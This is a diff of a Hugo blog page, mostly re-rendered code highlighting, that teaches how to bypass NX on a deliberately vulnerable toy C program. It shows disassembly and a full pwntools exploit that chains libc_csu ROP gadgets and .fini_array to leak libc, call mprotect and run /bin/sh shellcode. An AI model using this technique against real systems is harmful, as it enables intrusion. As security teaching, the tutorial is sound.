@@ -68,7 +68,7 @@
 
 
 <script>$(document).on('click', function() { $('.collapse').collapse('hide'); })</script>
- <meta name="generator" content="Hugo 0.92.2" />
+ <meta name="generator" content="Hugo 0.98.0" />
         
 
         
@@ -157,24 +157,24 @@
 
     <div align="left" class="content"><h1 id="intro">Intro</h1>
 <p>Some time ago, a friend of mine (<a href="https://dag-tech.github.io">dag-tech</a>), asked me about a technique to run a shellcode with <code>NX</code> enabled. So he gave me a simple program:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">//src.c
-</span><span style="color:#75715e"></span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e"></span>
-<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv) {
-	<span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">16</span>];
-	puts(<span style="color:#e6db74">&#34;Can you pwn me????&#34;</span>);
-	read(<span style="color:#ae81ff">0</span>, buf, <span style="color:#ae81ff">512</span>);
-	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-}
-</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ gcc -z noexecstack -fno-stack-protector -o vuln src.c
-$ checksec vuln
-    Arch:     amd64-64-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX enabled
-    PIE:      No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
-</code></pre></div><h1 id="the-approach">The approach</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">//src.c
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv) {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">16</span>];
+</span></span><span style="display:flex;"><span>	puts(<span style="color:#e6db74">&#34;Can you pwn me????&#34;</span>);
+</span></span><span style="display:flex;"><span>	read(<span style="color:#ae81ff">0</span>, buf, <span style="color:#ae81ff">512</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ gcc -z noexecstack -fno-stack-protector -o vuln src.c
+</span></span><span style="display:flex;"><span>$ checksec vuln
+</span></span><span style="display:flex;"><span>    Arch:     amd64-64-little
+</span></span><span style="display:flex;"><span>    RELRO:    Partial RELRO
+</span></span><span style="display:flex;"><span>    Stack:    No canary found
+</span></span><span style="display:flex;"><span>    NX:       NX enabled
+</span></span><span style="display:flex;"><span>    PIE:      No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
+</span></span></code></pre></div><h1 id="the-approach">The approach</h1>
 <p>The issue with <code>NX</code> is that we cannot execute code in writable memory segment. So we should find a way to disable, at run-time, this protection.</p>
 <p>Fortunately the <code>mprotect</code> function, in <code>libc</code>, just do this:</p>
 <pre tabindex="0"><code>NAME
@@ -189,7 +189,6 @@ DESCRIPTION
        The mprotect() function shall change the access protections to be that specified by prot for those whole pages containing any part of the address space of the  process  starting  at
        address  addr  and  continuing for len bytes. The parameter prot determines whether read, write, execute, or some combination of accesses are permitted to the data being mapped. The
        prot argument should be either PROT_NONE or the bitwise-inclusive OR of one or more of PROT_READ, PROT_WRITE, and PROT_EXEC.
-
 </code></pre><p>So here the exploit plan:</p>
 <ul>
 <li>Leak a function address in libc. In this way we can call mprotect</li>
@@ -240,141 +239,141 @@ However because <code>rbx</code> is equal to 0 the condition is reduced only to 
 <p><strong>BINGO!</strong></p>
 <p>In every <code>ELF</code> executable there is a <code>.fini_array</code> section, that is an array of <em>pointer to functions</em>. These functions should be called when the program exit.</p>
 <p>Let’s analyze this section with <code>r2</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ r2 -Ad vuln
-<span style="color:#f92672">[</span>r2<span style="color:#f92672">]</span>&gt; iS
-...
-
-<span style="color:#ae81ff">19</span> 0x00002e18     <span style="color:#ae81ff">8</span> 0x00403e18     <span style="color:#ae81ff">8</span> -rw- .fini_array
-...
-
-<span style="color:#f92672">[</span>r2<span style="color:#f92672">]</span>&gt; pxr <span style="color:#ae81ff">8</span> @0x00403e18
-0x00403e18 0x0000000000401100   ..@..... @loc.__init_array_end <span style="color:#ae81ff">0</span>
-<span style="color:#f92672">[</span>r2<span style="color:#f92672">]</span>&gt; pdf @0x0000000000401100
-    0x00401100      f30f1efa       endbr64
-    0x00401104      803d212f0000.  cmp byte <span style="color:#f92672">[</span>obj.completed.7387<span style="color:#f92672">]</span>, <span style="color:#ae81ff">0</span>
-,<span style="color:#f92672">=</span>&lt; 0x0040110b      <span style="color:#ae81ff">7513</span>           jne 0x401120
-|   ...
-|   ...
-|  0x00401116      c6050f2f0000.  mov byte <span style="color:#f92672">[</span>obj.completed.7387<span style="color:#f92672">]</span>, <span style="color:#ae81ff">1</span>
-|  0x0040111d      5d             pop rbp
-<span style="color:#e6db74">`</span>-&gt;0x00401120      c3             ret
-</code></pre></div><p>So if <code>[obj.completed.7387]</code> is different than 0 this function acts like a <code>NOP</code>. And at <code>0x00401116</code> <code>[obj.completed.7387]</code> is set to 1…</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ r2 -Ad vuln
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>r2<span style="color:#f92672">]</span>&gt; iS
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">19</span> 0x00002e18     <span style="color:#ae81ff">8</span> 0x00403e18     <span style="color:#ae81ff">8</span> -rw- .fini_array
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>r2<span style="color:#f92672">]</span>&gt; pxr <span style="color:#ae81ff">8</span> @0x00403e18
+</span></span><span style="display:flex;"><span>0x00403e18 0x0000000000401100   ..@..... @loc.__init_array_end <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>r2<span style="color:#f92672">]</span>&gt; pdf @0x0000000000401100
+</span></span><span style="display:flex;"><span>    0x00401100      f30f1efa       endbr64
+</span></span><span style="display:flex;"><span>    0x00401104      803d212f0000.  cmp byte <span style="color:#f92672">[</span>obj.completed.7387<span style="color:#f92672">]</span>, <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>,<span style="color:#f92672">=</span>&lt; 0x0040110b      <span style="color:#ae81ff">7513</span>           jne 0x401120
+</span></span><span style="display:flex;"><span>|   ...
+</span></span><span style="display:flex;"><span>|   ...
+</span></span><span style="display:flex;"><span>|  0x00401116      c6050f2f0000.  mov byte <span style="color:#f92672">[</span>obj.completed.7387<span style="color:#f92672">]</span>, <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>|  0x0040111d      5d             pop rbp
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">`</span>-&gt;0x00401120      c3             ret
+</span></span></code></pre></div><p>So if <code>[obj.completed.7387]</code> is different than 0 this function acts like a <code>NOP</code>. And at <code>0x00401116</code> <code>[obj.completed.7387]</code> is set to 1…</p>
 <p><strong>PERFECT! :D</strong></p>
 <p>We have all elements in place.</p>
 <p>So to recap: <code>r15</code> should contain the <code>.fini_array</code> address but before the first element of the <code>ROP chain</code> we should call <code>0x00401116</code> to set <code>obj.completed.7387</code> to 1.
 In this way the call acts like a <code>NOP</code>.</p>
 <p>So here the exploit:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python2</span>
-
-<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-
-prog <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(os<span style="color:#f92672">.</span>getcwd() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/vuln&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
-
-<span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>:
-	host <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]
-	port <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
-	t <span style="color:#f92672">=</span> remote(host, port)
-<span style="color:#66d9ef">else</span>:
-	t <span style="color:#f92672">=</span> prog<span style="color:#f92672">.</span>process()
-	mprotect_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> <span style="color:#75715e"># this is libc dependent</span>
-
-offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">24</span>
-header <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>offset
-shellcode <span style="color:#f92672">=</span> asm(shellcraft<span style="color:#f92672">.</span>sh())
-gotplt  <span style="color:#f92672">=</span> prog<span style="color:#f92672">.</span>get_section_by_name(<span style="color:#e6db74">&#34;.got.plt&#34;</span>)<span style="color:#f92672">.</span>header<span style="color:#f92672">.</span>sh_addr
-fini_array <span style="color:#f92672">=</span> prog<span style="color:#f92672">.</span>get_section_by_name(<span style="color:#e6db74">&#34;.fini_array&#34;</span>)<span style="color:#f92672">.</span>header<span style="color:#f92672">.</span>sh_addr
-read <span style="color:#f92672">=</span> prog<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#34;read&#34;</span>]
-puts <span style="color:#f92672">=</span> prog<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#34;puts&#34;</span>]
-main <span style="color:#f92672">=</span> prog<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;main&#34;</span>]
-
-prdi     <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x004011d3</span> <span style="color:#75715e"># pop rdi</span>
-
-brdx     <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x004011ca</span> <span style="color:#75715e"># pop rbx</span>
-                      <span style="color:#75715e"># pop rbp</span>
-                      <span style="color:#75715e"># pop r12</span>
-                      <span style="color:#75715e"># pop r13</span>
-                      <span style="color:#75715e"># `pr14 stuff`</span>
-
-pr14     <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x004011d0</span> <span style="color:#75715e"># pop r14</span>
-                      <span style="color:#75715e"># pop r15</span>
-
-mr14trdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x004011b0</span> <span style="color:#75715e"># mov rdx, r14</span>
-                      <span style="color:#75715e"># mov rsi, r13</span>
-                      <span style="color:#75715e"># mov edi, r12d</span>
-                      <span style="color:#75715e"># call qword [r15 + rbx*8]</span>
-                      <span style="color:#75715e"># add rbx, 1</span>
-                      <span style="color:#75715e"># cmp rbp, rbx</span>
-                      <span style="color:#75715e"># jne 0x4011b0 -&gt; SHOULD FAIL</span>
-                      <span style="color:#75715e"># add rsp, 8</span>
-                      <span style="color:#75715e"># `brdx stuff`</span>
-
-completedToOne <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00401116</span> <span style="color:#75715e"># mov byte [obj.completed], 1</span>
-                            <span style="color:#75715e"># pop rbp</span>
-
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">init_urop</span>():
-	payload <span style="color:#f92672">=</span> p64(completedToOne)
-	payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;J&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
-	<span style="color:#66d9ef">return</span> payload
-
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">urop</span>(fn, rdi, rsi<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>, rdx<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>):
-	payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
-	<span style="color:#75715e"># set rsi and rdx</span>
-	payload <span style="color:#f92672">+=</span> p64(brdx)
-	payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)   <span style="color:#75715e">#rbx</span>
-	payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">1</span>)   <span style="color:#75715e">#rbp</span>
-	payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;J&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>    <span style="color:#75715e">#r12</span>
-	payload <span style="color:#f92672">+=</span> p64(rsi) <span style="color:#75715e">#r13</span>
-	payload <span style="color:#f92672">+=</span> p64(rdx) <span style="color:#75715e">#r14</span>
-	payload <span style="color:#f92672">+=</span> p64(fini_array) <span style="color:#75715e">#r15</span>
-	payload <span style="color:#f92672">+=</span> p64(mr14trdx)
-	payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;J&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">56</span>
-	<span style="color:#75715e"># set rdi</span>
-	payload <span style="color:#f92672">+=</span> p64(prdi)
-	payload <span style="color:#f92672">+=</span> p64(rdi)
-	<span style="color:#75715e"># fn</span>
-	payload <span style="color:#f92672">+=</span> p64(fn)
-	<span style="color:#66d9ef">return</span> payload
-
-<span style="color:#75715e"># stage1: leak puts@libc, so get mprotect@libc.</span>
-
-payload <span style="color:#f92672">=</span> header
-payload <span style="color:#f92672">+=</span> init_urop()
-payload <span style="color:#f92672">+=</span> urop(puts, prog<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#34;puts&#34;</span>])
-payload <span style="color:#f92672">+=</span> p64(main)
-
-t<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Can you pwn me????</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
-t<span style="color:#f92672">.</span>sendline(payload)
-
-puts_libc <span style="color:#f92672">=</span> u64(t<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
-mprotect_libc <span style="color:#f92672">=</span> puts_libc <span style="color:#f92672">-</span> mprotect_offset
-log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;puts@libc: </span><span style="color:#e6db74">{:#x}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(puts_libc))
-log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;mprotect@libc: </span><span style="color:#e6db74">{:#x}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(mprotect_libc))
-
-<span style="color:#75715e"># stage2: read(0, gotplt, len(shellcode))</span>
-<span style="color:#75715e">#         mprotect(gotplt, len(shellcode), PROT_READ | PROT_WRITE | PROT_EXEC)</span>
-<span style="color:#75715e">#         jmp to the shellcode</span>
-payload <span style="color:#f92672">=</span> header
-payload <span style="color:#f92672">+=</span> urop(read, <span style="color:#ae81ff">0</span>, gotplt, len(shellcode))
-payload <span style="color:#f92672">+=</span> urop(mprotect_libc, gotplt, len(shellcode), <span style="color:#ae81ff">7</span>)
-payload <span style="color:#f92672">+=</span> p64(gotplt)
-
-t<span style="color:#f92672">.</span>sendline(payload)
-t<span style="color:#f92672">.</span>sendline(shellcode)
-log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;DONE&#34;</span>)
-
-t<span style="color:#f92672">.</span>recvrepeat(<span style="color:#ae81ff">0.3</span>)
-t<span style="color:#f92672">.</span>interactive()
-t<span style="color:#f92672">.</span>close()
-</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ./exploit.py
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting local process <span style="color:#e6db74">&#39;/path/to/vuln&#39;</span>
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> puts@libc: puts_address
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> mprotect@libc: mprotect_address
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> DONE
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
-$ echo hi :<span style="color:#f92672">)</span>
-hi :<span style="color:#f92672">)</span>
-$
-</code></pre></div><h2 id="references">References</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python2</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>prog <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(os<span style="color:#f92672">.</span>getcwd() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/vuln&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>:
+</span></span><span style="display:flex;"><span>	host <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>	port <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>	t <span style="color:#f92672">=</span> remote(host, port)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>	t <span style="color:#f92672">=</span> prog<span style="color:#f92672">.</span>process()
+</span></span><span style="display:flex;"><span>	mprotect_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> <span style="color:#75715e"># this is libc dependent</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">24</span>
+</span></span><span style="display:flex;"><span>header <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>offset
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> asm(shellcraft<span style="color:#f92672">.</span>sh())
+</span></span><span style="display:flex;"><span>gotplt  <span style="color:#f92672">=</span> prog<span style="color:#f92672">.</span>get_section_by_name(<span style="color:#e6db74">&#34;.got.plt&#34;</span>)<span style="color:#f92672">.</span>header<span style="color:#f92672">.</span>sh_addr
+</span></span><span style="display:flex;"><span>fini_array <span style="color:#f92672">=</span> prog<span style="color:#f92672">.</span>get_section_by_name(<span style="color:#e6db74">&#34;.fini_array&#34;</span>)<span style="color:#f92672">.</span>header<span style="color:#f92672">.</span>sh_addr
+</span></span><span style="display:flex;"><span>read <span style="color:#f92672">=</span> prog<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#34;read&#34;</span>]
+</span></span><span style="display:flex;"><span>puts <span style="color:#f92672">=</span> prog<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#34;puts&#34;</span>]
+</span></span><span style="display:flex;"><span>main <span style="color:#f92672">=</span> prog<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;main&#34;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>prdi     <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x004011d3</span> <span style="color:#75715e"># pop rdi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>brdx     <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x004011ca</span> <span style="color:#75715e"># pop rbx</span>
+</span></span><span style="display:flex;"><span>                      <span style="color:#75715e"># pop rbp</span>
+</span></span><span style="display:flex;"><span>                      <span style="color:#75715e"># pop r12</span>
+</span></span><span style="display:flex;"><span>                      <span style="color:#75715e"># pop r13</span>
+</span></span><span style="display:flex;"><span>                      <span style="color:#75715e"># `pr14 stuff`</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pr14     <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x004011d0</span> <span style="color:#75715e"># pop r14</span>
+</span></span><span style="display:flex;"><span>                      <span style="color:#75715e"># pop r15</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>mr14trdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x004011b0</span> <span style="color:#75715e"># mov rdx, r14</span>
+</span></span><span style="display:flex;"><span>                      <span style="color:#75715e"># mov rsi, r13</span>
+</span></span><span style="display:flex;"><span>                      <span style="color:#75715e"># mov edi, r12d</span>
+</span></span><span style="display:flex;"><span>                      <span style="color:#75715e"># call qword [r15 + rbx*8]</span>
+</span></span><span style="display:flex;"><span>                      <span style="color:#75715e"># add rbx, 1</span>
+</span></span><span style="display:flex;"><span>                      <span style="color:#75715e"># cmp rbp, rbx</span>
+</span></span><span style="display:flex;"><span>                      <span style="color:#75715e"># jne 0x4011b0 -&gt; SHOULD FAIL</span>
+</span></span><span style="display:flex;"><span>                      <span style="color:#75715e"># add rsp, 8</span>
+</span></span><span style="display:flex;"><span>                      <span style="color:#75715e"># `brdx stuff`</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>completedToOne <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00401116</span> <span style="color:#75715e"># mov byte [obj.completed], 1</span>
+</span></span><span style="display:flex;"><span>                            <span style="color:#75715e"># pop rbp</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">init_urop</span>():
+</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">=</span> p64(completedToOne)
+</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;J&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> payload
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">urop</span>(fn, rdi, rsi<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>, rdx<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>):
+</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># set rsi and rdx</span>
+</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">+=</span> p64(brdx)
+</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)   <span style="color:#75715e">#rbx</span>
+</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">1</span>)   <span style="color:#75715e">#rbp</span>
+</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;J&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>    <span style="color:#75715e">#r12</span>
+</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">+=</span> p64(rsi) <span style="color:#75715e">#r13</span>
+</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">+=</span> p64(rdx) <span style="color:#75715e">#r14</span>
+</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">+=</span> p64(fini_array) <span style="color:#75715e">#r15</span>
+</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">+=</span> p64(mr14trdx)
+</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;J&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">56</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># set rdi</span>
+</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">+=</span> p64(prdi)
+</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">+=</span> p64(rdi)
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># fn</span>
+</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">+=</span> p64(fn)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> payload
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># stage1: leak puts@libc, so get mprotect@libc.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> header
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> init_urop()
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> urop(puts, prog<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#34;puts&#34;</span>])
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(main)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>t<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Can you pwn me????</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>t<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>puts_libc <span style="color:#f92672">=</span> u64(t<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
+</span></span><span style="display:flex;"><span>mprotect_libc <span style="color:#f92672">=</span> puts_libc <span style="color:#f92672">-</span> mprotect_offset
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;puts@libc: </span><span style="color:#e6db74">{:#x}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(puts_libc))
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;mprotect@libc: </span><span style="color:#e6db74">{:#x}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(mprotect_libc))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># stage2: read(0, gotplt, len(shellcode))</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#         mprotect(gotplt, len(shellcode), PROT_READ | PROT_WRITE | PROT_EXEC)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#         jmp to the shellcode</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> header
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> urop(read, <span style="color:#ae81ff">0</span>, gotplt, len(shellcode))
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> urop(mprotect_libc, gotplt, len(shellcode), <span style="color:#ae81ff">7</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(gotplt)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>t<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>t<span style="color:#f92672">.</span>sendline(shellcode)
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;DONE&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>t<span style="color:#f92672">.</span>recvrepeat(<span style="color:#ae81ff">0.3</span>)
